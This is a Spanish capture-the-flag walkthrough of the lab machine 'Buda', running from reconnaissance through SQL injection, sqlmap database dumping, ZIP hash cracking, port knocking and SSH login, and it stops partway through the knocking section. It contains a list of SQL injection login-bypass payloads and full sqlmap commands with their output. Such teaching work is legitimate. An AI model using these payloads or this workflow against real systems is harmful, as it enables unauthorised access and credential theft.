---
title: "Buda - TheHackerLabs"
date: 2025-09-08
draft: false
slug: "THL-writeup-buda"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos y de analizar la página web activa del puerto 80, descubrimos el archivo robots.txt que contiene un dominio. Registramos ese dominio en el /etc/hosts y los visitamos, encontrando una página en mantenimiento. Al no encontrar nada en el dominio, aplicamos Fuzzing para encontrar subdominios, encontrando uno que, al registrar en el /etc/hosts, vemos que muestra un login. Haciendo pruebas en el login, descubrimos que es vulnerable Inyecciones SQL, por lo que usamos SQLMAP para dumpear las bases de datos, siendo que vemos una que contiene credenciales válidas para el servicio FTP. Enumeramos el FTP, obteniendo un archivo de texto con números y un archivo ZIP que logramos crackear para ver su contenido. Resulta que el archivo ZIP tenía un reporte de una auditoria interna, que a su vez, el reporte contiene un usuario y contraseña que son válidos para el servicio SSH, pero este servicio no está abierto, siendo imposible su acceso. Investigando un poco, descubrimos que los números corresponden a una secuencia de puertos que podemos usar para aplicar Port Knocking para habilitar el puerto 22 (servicio SSH). Encontramos la secuencia correcta de puertos, activando el puerto 22 y logramos ganar acceso a la máquina víctima vía SSH. Dentro, vemos que nuestro usuario pertenece al grupo Docker. Utilizamos la guía de GTFOBins para usar un comando de Docker que crea una montura de la raíz de la máquina víctima en un contenedor, en donde cualquier cambio aplicado, se refleja fuera del contenedor, siendo así que escalamos privilegios y nos convertimos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "FTP", "MySQL", "Web Enumeration", "Fuzzing", "Subdomain Fuzzing", "SQL Injection", "SQLi Automatization (SQLMAP)", "FTP Enumeration", "Cracking Hash", "Cracking ZIP File", "Information Leakage", "Port Knocking", "Abusing Docker Group", "Privesc - Abusing Docker Group", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "nikto"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "ffuf"
  - "sqlmap"
  - "ftp"
  - "cat"
  - "unzip"
  - "zip2john"
  - "JohnTheRipper"
  - "sudo"
  - "apt"
  - "knock"
  - "ssh"
  - "wget"
  - "pip"
  - "python"
  - "grep"
  - "find"
  - "id"
  - "docker"
  - "chmod"
  - "bash"
links:
  - "https://www.welivesecurity.com/la-es/2013/03/08/port-knocking-para-reforzar-la-seguridad-de-un-servidor/"
  - "https://github.com/eliemoutran/KnockIt"
  - "https://gtfobins.github.io/gtfobins/docker/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-buda/buda.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.90
PING 192.168.100.90 (192.168.100.90) 56(84) bytes of data.
64 bytes from 192.168.100.90: icmp_seq=1 ttl=64 time=2.67 ms
64 bytes from 192.168.100.90: icmp_seq=2 ttl=64 time=1.09 ms
64 bytes from 192.168.100.90: icmp_seq=3 ttl=64 time=0.862 ms
64 bytes from 192.168.100.90: icmp_seq=4 ttl=64 time=1.27 ms

--- 192.168.100.90 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3010ms
rtt min/avg/max/mdev = 0.862/1.472/2.674/0.708 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.90 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 11:03 CST
Initiating ARP Ping Scan at 11:03
Scanning 192.168.100.90 [1 port]
Completed ARP Ping Scan at 11:03, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:03
Scanning 192.168.100.90 [65535 ports]
Discovered open port 21/tcp on 192.168.100.90
Discovered open port 80/tcp on 192.168.100.90
Completed SYN Stealth Scan at 11:04, 38.34s elapsed (65535 total ports)
Nmap scan report for 192.168.100.90
Host is up, received arp-response (0.00074s latency).
Scanned at 2025-09-08 11:03:24 CST for 38s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 38.64 seconds
           Raw packets sent: 131078 (5.767MB) | Rcvd: 14 (680B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay 2 puertos abiertos y me da curiosidad ver el **puerto 21** abierto, pero no el **puerto 22**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,80 192.168.100.90 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 11:05 CST
Nmap scan report for 192.168.100.90
Host is up (0.00078s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El **puerto 21** que es del **servicio FTP** no tiene activo el **usuario anonymous**, por lo que no podremos entrar ahí, a menos que tengamos credenciales válidas.

La página web activa del **puerto 80** solamente muestra la página por defecto de **Apache2**.

Quizá encontremos algo oculto ahí.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura1.png">
</p>

Pues sí, solo es la página por defecto de **Apache2**.

Revisando el código fuente y las tecnologías, no encontraremos nada.

Y si aplicamos **Fuzzing**, tampoco encontraremos algo.

Para estos casos, una buena herramienta para estos casos puede ser **nikto**, pues puede que encuentre algo oculto por ahí:
```bash
nikto -h http://192.168.100.90
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.90
+ Target Hostname:    192.168.100.90
+ Target Port:        80
+ Start Time:         2025-09-08 11:10:32 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 29af, size: 61750bd07b0da, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
+ 8103 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-09-08 11:11:12 (GMT-6) (40 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Encontro el archivo **robots.txt**.

Veamos qué contiene:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura2.png">
</p>

Encontramos un dominio, así que vamos a registrarlo en el `/etc/hosts`:
```bash
echo "192.168.100.90 budasec.thl" >> /etc/hosts
```

Ahora, entremos a ese dominio:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura3.png">
</p>

Es una página en desarrollo que muestra un contador de cuantos días faltan para que estén de regreso.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura4.png">
</p>

No hay mucho que destacar.

Ahí podemos ver un input, pero su botón de acción no funciona, pues no tiene una acción asignada:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura5.png">
</p>

No encontraremos algo más.

Te diría que aplicáramos **Fuzzing**, pero no encontraremos nada de directorios o archivos ocultos.

**Nikto** tampoco encontrará algo, por lo que nos quedamos con pocas acciones.

Algo que podemos hacer, ya que hay un dominio involucrado, es aplicar **Fuzzing** al dominio para encontrar subdominios.

### Fuzzing a Dominio para Encontrar Subdominios {#fuzz}

Primero, probaremos con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://budasec.thl -H "Host: FUZZ.budasec.thl" -t 300 -fw 3496

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://budasec.thl
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.budasec.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3496
________________________________________________

dev                     [Status: 200, Size: 264, Words: 47, Lines: 12, Duration: 16ms]
:: Progress: [4989/4989] :: Job [1/1] :: 201 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

Ahora probemos con **gobuster**:
```bash
gobuster vhost -u http://budasec.thl/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 300
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://budasec.thl/
[+] Method:                    GET
[+] Threads:                   300
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.budasec.thl Status: 200 [Size: 264]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

Y por último, la herramienta **wfuzz**:
```bash
wfuzz -c --hc=404 --hh=10671 -t 300 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.budasec.thl" http://budasec.thl
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://budasec.thl/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000019:   200        11 L     20 W       263 Ch      "dev"                                                                                                                        
000009532:   400        10 L     35 W       299 Ch      "#www"                                                                                                                       
000010581:   400        10 L     35 W       299 Ch      "#mail"                                                                                                                      

Total time: 0
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 0
```
En las 3 opciones hemos encontrado 1 subdominio.

Vamos a registrarlo en el `/etc/hosts` y entremos a ese subdominio:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura6.png">
</p>

Encontramos un login.

Como no tenemos credenciales válidas, podemos intentar probar **Inyecciones SQL**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Inyecciones SQL en Login de Subdominio {#SQLi}

Imaginemos que la consulta que se hace en el login es la siguiente:
```bash
SELECT * FROM users WHERE username = 'usuario' and password = 'contraseña';
```
En este caso debemos identificar qué campo es vulnerable, si el campo del usuario o el de la contraseña.

Lo principal que podemos hacer es, provocar un error en la consulta probando en cada campo o en ambos, y podemos hacerlo con alguna de las siguientes inyecciones:
```bash
'
"
# 
;
)
admin'-- -
admin'--
admin' #
admin' or 1=1--
admin' or 1=1#
admin' or '1'='1
admin' or '1'='1'-- -
admin' or 1=1/*
admin' /*
admin')-- -
admin' ) or '1'='1--
admin' ) or ('1'='1--
```

Resulta que las inyecciones:
```bash
'
admin'--
admin' or 1=1--
admin' or 1=1/*
admin' /*
admin')-- -
admin' ) or '1'='1--
```

Provocan un error y que solo sirven en el campo del usuario:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura7.png">
</p>

Podemos decir que el campo vulnerable es el campo del usuario.

Probando otras inyecciones, nos percatamos de que sí o sí debemos meter un usuario válido para que funcione la inyección, por lo que es posible que se esté aplicando un filtro en donde se comprueba si el usuario existe o no dentro de la base de datos.

Esto porque si usamos la siguiente **inyección SQL basada en tiempo**, funciona:
```bash
admin' and sleep(5)-- -
```

Mientras que una inyección sin ese usuario o usando otro o un texto random, la inyección no funcionará:
```bash
test' and sleep(5)-- -
' and sleep(5)-- -
kmuvxqw' and sleep(5)-- -
```

Curiosamente, este usuario tiene una credencial débil, siendo **admin123**, pero cuando lo usamos en el login, nos da esto:

<p align="center">
<img src="/assets/images/THL-writeup-buda/Captura8.png">
</p>

Entonces, es mejor dumpear los datos de las bases de datos.

Vamos a automatizar el dumpeo de datos con **SQLMAP**.

### Automatizando Inyecciones SQL con SQLMAP para Dumpear Datos de Bases de Datos y Ganando Acceso a Servicio FTP {#SQLMAP}

Comprobemos que el formulario es vulnerable con **SQLMAP**:
```bash
sqlmap -u 'http://dev.budasec.thl/' --batch --forms
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: username=admin' AND EXTRACTVALUE(7546,CASE WHEN (7546=7546) THEN 7546 ELSE 0x3A END)-- iJyx&password=admin

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=admin' AND GTID_SUBSET(CONCAT(0x71706a6a71,(SELECT (ELT(3738=3738,1))),0x716a7a7a71),3738)-- ttTK&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3251 FROM (SELECT(SLEEP(5)))OSrU)-- aUNb&password=admin
---
do you want to exploit this SQL injection? [Y/n] Y
[16:03:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.6
....
```

| Parámetros | Descripción |
|---|---|
| *-u*	     | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |

Muy bien, si es vulnerable.

Ahora obtengamos las bases de datos existentes:
```bash
sqlmap -u 'http://dev.budasec.thl/' --batch --forms --dbs
...
available databases [5]:
[*] buda
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
...
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *--dbs*    | Enumera todas las bases de datos disponibles. |

Obtengamos las tablas de la **BD buda**:
```bash
sqlmap -u 'http://dev.budasec.thl/' --batch --forms -D buda --tables
...
[16:03:33] [INFO] fetching tables for database: 'buda'
[16:03:33] [INFO] resumed: 'users'
Database: buda
[1 table]
+-------+

| users |
+-------+
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *-D*	     | Selecciona una base de datos especifica a enumerar. |
| *--tables* | Enumera las tablas de una base de datos específica. |

Solo hay una tabla.

Vamos a dumpear todos los datos de esta tabla:
```bash
sqlmap -u 'http://dev.budasec.thl/' --batch --forms -D buda -T users --dump
...
Database: buda
Table: users
[4 entries]
+----+-----------------+----------+--------------------------------------------------------------+

| id | password        | username | hashed_password                                              |
+----+-----------------+----------+--------------------------------------------------------------+

| 1  | ftpu@sr123p@@s! | ftpuser  | $2y$10$.gKHPvTvYkWfbRxtid10s.kgGWekExh9kx.Q/QMbaKQlH/ia6xx66 |
| 4  | admin123        | admin    | $2y$10$GgGK5MsjTbGrjqkTsLXCcOD0dui1zAXhTE72lDVB.c4igQQwHdP5a |
| 5  | password1       | user1    | $2y$10$6f8FfvozmWozwY3zeFvUCutLq4421U4RqTpXIfzITrrKG4KlnqWbm |
| 6  | password2       | user2    | $2y$10$UrcCrnPw7IdNp8minBpPC.HeXiQTlJ0dmVz0hWhqUfmcmRk6GdCg6 |
+----+-----------------+----------+--------------------------------------------------------------+
...
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Define la URL objetivo. |
| *--batch*  | Ejecuta el comando sin solicitar confirmaciones al usuario. |
| *--forms*  | Analiza y prueba formularios en la URL objetivo. |
| *-D*       | Selecciona una base de datos específica a enumerar. |
| *-T*       | Selecciona una tabla específica a enumerar. |
| *--dump*   | Extraer datos de una tabla específica. |

Podemos ver las credenciales de acceso para el **servicio FTP**.

Vamos a probarlas:
```bash
ftp 192.168.100.90
Connected to 192.168.100.90.
220 (vsFTPd 3.0.5)
Name (192.168.100.90:berserkwings): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Estamos dentro.

### Enumeración de Servicio FTP y Crackeo de Archivo ZIP {#FTP}

Algo curioso pasa cuando intentamos listar los archivos:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||25602|)
^C
receive aborted. Waiting for remote to finish abort.
ftp>
```
Parece que estamos en el modo pasivo, lo que impide que podamos listar los archivos.

Simplemente, hay que apagarlo con el **comando passive**:
```bash
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
dr-xr-x---    3 1001     1001         4096 Jun 07  2024 .
dr-xr-x---    3 1001     1001         4096 Jun 07  2024 ..
lrwxrwxrwx    1 0        0               9 Jun 07  2024 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 May 01  2024 .bash_logout
-rw-r--r--    1 1001     1001         3771 May 01  2024 .bashrc
-rw-r--r--    1 1001     1001          807 May 01  2024 .profile
drwxr-xr-x    6 1001     1001         4096 Jun 06  2024 ftp
```
Listo, ya podemos ver los archivos y ahí está un directorio llamado **ftp**.

Entremos ahí y veamos qué archivos existen:
```bash
ftp> cd ftp
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    6 1001     1001         4096 Jun 06  2024 .
dr-xr-x---    3 1001     1001         4096 Jun 07  2024 ..
drwxr-xr-x    2 0        0            4096 Jun 06  2024 config
drwxr-xr-x    3 0        0            4096 Jun 06  2024 documents
drwxr-xr-x    2 1001     1001         4096 Jun 06  2024 downloads
drwxr-xr-x    2 1001     1001         4096 Jun 06  2024 uploads
226 Directory send OK.
```
Vemos varios directorios.

Pero encontraremos archivos en el directorio **documents**:
```bash
ftp> cd documents
250 Directory successfully changed.
ftp> ls -la
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Jun 06  2024 .
drwxr-xr-x    6 1001     1001         4096 Jun 06  2024 ..
-rw-r--r--    1 0        0               2 Jun 06  2024 README.md
drwxr-xr-x    2 0        0            4096 Jun 06  2024 backup_2022
-rw-r--r--    1 0        0             499 Jun 06  2024 decrypt.py
-rw-r--r--    1 0        0            1870 Jun 06  2024 documents.zip
-rw-r--r--    1 0        0              15 Jun 06  2024 knock
226 Directory send OK.
```

Vamos a descargar los archivos **decrypt.py, documents.zip y knock**:
```bash
ftp> get decrypt.py
ftp> get documents.zip
ftp> get knock
```

Primero, leamos el script de **Python**:
```bash
cat decrypt.py
import time

def descifrar_datos(datos_encriptados, clave):
    print("Iniciando proceso de descifrado ultra-seguro...")
    time.sleep(2)
    print("Descifrado completo.")
    return "Datos descifrados con éxito."

def main():
    datos_encriptados = "9F&3j$!w@KLnOp$9F&3j$!w@KLnOp$9F&3j$!w@KLnOp$"
    clave = "clave_ultra_secreta"
    datos_descifrados = descifrar_datos(datos_encriptados, clave)
    print("Los datos descifrados son:", datos_descifrados)

if __name__ == "__main__":
    main()
```
Este script pareciera que descifra algún dato, pero no hace nada más que aplicar un `sleep()` por 2 segundos.

Podemos leer el **archivo knock**:
```bash
cat knock
9467
1739
8745
```
Son números, pero no sabemos de qué o para qué son.

Por último, si tratamos de descomprimir el **archivo ZIP**, nos pedirá una contraseña:
```bash
unzip documents.zip
Archive:  documents.zip
[documents.zip] audit2024 password:
```
Vamos a crackearlo.

Obtengamos el hash del **archivo ZIP** con **zip2john**:
```bash
zip2john documents.zip > hash
ver 2.0 efh 5455 efh 7875 documents.zip/audit2024 PKZIP Encr: TS_chk, cmplen=1686, decmplen=4059, crc=BA0AACAB ts=6BDB cs=6bdb type=8
```

Lo crackeamos con la herramienta **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manuelito        (documents.zip/audit2024)     
1g 0:00:00:00 DONE (2025-09-08 12:58) 25.00g/s 307200p/s 307200c/s 307200C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ya podemos descomprimir el archivo:
```bash
unzip documents.zip
Archive:  documents.zip
[documents.zip] audit2024 password: 
  inflating: audit2024
```
Nos da un archivo de texto que parece ser un reporte de una auditoria a una empresa.

Al leerlo, hay una parte que menciona a un usuario y su contraseña:
```bash
cat audit2024
Audit Report
Company: ABC Manufacturing Inc.
Period: Fiscal Year 2023
Auditor: XYZ Auditing Services
Date: June 5, 2024
Executive Summary
XYZ Auditing Services conducted an independent audit of the financial statements...
...
...
Identified Risks:
Exposure to foreign currency exchange fluctuations due to international operations.
Dependency on a limited number of key suppliers for raw materials.
Exposed yolanda user credentials:y@lAnd361!
Mitigation Strategies: The company has partially implemented strategies to mitigate these risks but further improvement is recommended.
Recommendations
...
```
Dichas credenciales no funcionan en el **servicio FTP**, por lo que puede que funcionen en el **servicio SSH**, pero su puerto no está activo.

Debemos investigar qué podemos hacer en este caso.

### Aplicando Port Knocking para Levantar Temporalmente Servicio SSH en Puerto 22 {#Knocking}

Investigando un poco, el **archivo knock** nos da una pista de qué podemos aplicar.

¿Qué es el **Port Knocking**?

| **Port Knocking** |
|:-----------------:|
| *El port knocking es una técnica de seguridad que se usa mucho en entornos de administración de servidores. Es un mecanismo en el que un firewall mantiene cerrado un puerto (ejemplo: 22/SSH) y solo lo abre si detecta que un cliente realiza una secuencia predefinida de conexiones a ciertos puertos (los "golpes" o knocks).* |

La idea es que tenemos que usar una secuencia de números para abrir un puerto, que supongamos es el **puerto 22 (servicio SSH)** siendo que ya tenemos algunos números que encontramos en el **servicio FTP**.

Esto se puede aplicar de varias maneras como con las herramientas **knock, nmap, nc** y una herramienta llamada **KnockIt**.

Vamos a realizar el **Kocking** con la herramienta **knock y KnockIt**. Esto es porque es más fácil de aplicarlo con estas herramientas, ya que con **nmap y nc**, se deben dar los números 1 por 1 y no todos de una vez, por lo que nos tardaríamos más en descubrir la secuencia correcta.

#### Aplicando Port Knocking con Herramienta knock {#knock}

Instalemos la herramienta **knock**:
```bash
sudo apt install knockd
```

Su uso es muy simple, solo tenemos que darle la IP de la máquina y los números a usar en el **Knocking**:
```bash
knock 192.168.100.90 9467 1739 8745
```

Ahora podemos comprobar si se abrió el **puerto 22** con **nmap**:
```bash
nmap -p 22 -sCV 192.168.100.90
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 18:15 CST
Nmap scan report for budasec.thl (192.168.100.90)
Host is up (0.00094s latency).

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.67 seconds
```
No se abrió.

Podemos intentar varias secuencias, siendo la siguiente la que abre el **puerto 22**:
```bash
knock 192.168.100.90 8745 9467 1739
```

Compruébalo con **nmap**:
```bash
nmap -p 22 -sCV 192.168.100.90
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 18:16 CST
Nmap scan report for budasec.thl (192.168.100.90)
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 5e:7a:33:3e:a4:41:3c:4b:4e:cc:9e:3c:ce:6e:86:b2 (ECDSA)
|_  256 8e:56:95:61:f5:77:4e:17:37:29:35:0f:a7:33:98:1a (ED25519)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.47 seconds
```

Comprobemos si sirven las credenciales que encontramos en este servicio:
```bash
ssh yolanda@192.168.100.90
yolanda@192.168.100.90's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
...
Last login: Fri Jun  7 16:00:19 2024
-bash-5.1$ whoami
yolanda
```
Estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
-bash-5.1$ ls
user.txt
-bash-5.1$ cat user.txt
...
```

#### Aplicando Port Knocking con Herramienta KnockIt {#KnockIt}

Aquí puedes encontrar el repositorio de la herramienta:
* <a href="https://github.com/eliemoutran/KnockIt" target="_blank">Repositorio de eliemoutran: KnockIt</a>

Descarguemos la herramienta con **wget**:
```bash
wget https://raw.githubusercontent.com/eliemoutran/KnockIt/refs/heads/master/knockit.py
```

Si es necesario, instala el módulo **itertools**:
```bash
pip install itertools
```

Lo ejecutamos con **python** y vemos su forma de uso:
```bash
python knockit.py

******************************************************
*                                                    *
*  _  __                     _     _____  _          *
* | |/ /                    | |   |_   _|| |         *
* | ' /  _ __    ___    ___ | | __  | |  | |_        *
* |  <  | '_ \  / _ \  / __|| |/ /  | |  | __|       *
* | . \ | | | || (_) || (__ |   <  _| |_ | |_        *
* |_|\_\|_| |_| \___/  \___||_|\_\|_____| \__|       *
*                                                    *
*                                                    *
* KnockIt v1.0                                       *
* Coded by thebish0p                                 *
* https://github.com/thebish0p/                      *
******************************************************

usage: knockit.py [-h] [-d DELAY] [-b] host ports [ports ...]
knockit.py: error: the following arguments are required: host, ports
```

Podemos usar el parámetro **-b** para aplicar fuerza bruta y tener un listado de varias secuencias que podemos probar:
```bash
python knockit.py -b 192.168.100.90 9467 1739 8745

******************************************************
*                                                    *
*  _  __                     _     _____  _          *
* | |/ /                    | |   |_   _|| |         *
* | ' /  _ __    ___    ___ | | __  | |  | |_        *
* |  <  | '_ \  / _ \  / __|| |/ /  | |  | __|       *
* | . \ | | | || (_) || (__ |   <  _| |_ | |_        *
* |_|\_\|_| |_| \___/  \___||_|\_\|_____| \__|       *
*                                                    *
*                                                    *
* KnockIt v1.0                                       *
* Coded by thebish0p                                 *
* https://github.com/thebish0p/                      *
******************************************************

[+] Knockit started attacking with all the possible combinations

******************************************************
[+] Knocking with sequence: (9467, 1739, 8745)
[+] Knocking on port 192.168.100.90:9467
[+] Knocking on port 192.168.100.90:1739
[+] Knocking on port 192.168.100.90:8745
******************************************************
[+] Knocking with sequence: (9467, 8745, 1739)
[+] Knocking on port 192.168.100.90:9467
[+] Knocking on port 192.168.100.90:8745
[+] Knocking on port 192.168.100.90:1739
******************************************************
[+] Knocking with sequence: (1739, 9467, 8745)
[+] Knocking on port 192.168.100.90:1739
[+] Knocking on port 192.168.100.90:9467
[+] Knocking on port 192.168.100.90:8745
******************************************************
[+] Knocking with sequence: (1739, 8745, 9467)
[+] Knocking on port 192.168.100.90:1739
[+] Knocking on port 192.168.100.90:8745
[+] Knocking on port 192.168.100.90:9467
******************************************************
[+] Knocking with sequence: (8745, 9467, 1739)
[+] Knocking on port 192.168.100.90:8745
[+] Knocking on port 192.168.100.90:9467
[+] Knocking on port 192.168.100.90:1739
******************************************************
[+] Knocking with sequence: (8745, 1739, 9467)
[+] Knocking on port 192.168.100.90:8745
[+] Knocking on port 192.168.100.90:1739
[+] Knocking on port 192.168.100.90:9467
******************************************************
```
Podría que esto haya abierto el **puerto 22**, pero en mi caso no fue así.

Pero podemos probar las secuencias que usó la herramienta, siendo que descubrimos la misma secuencia para activar el **puerto 22**:
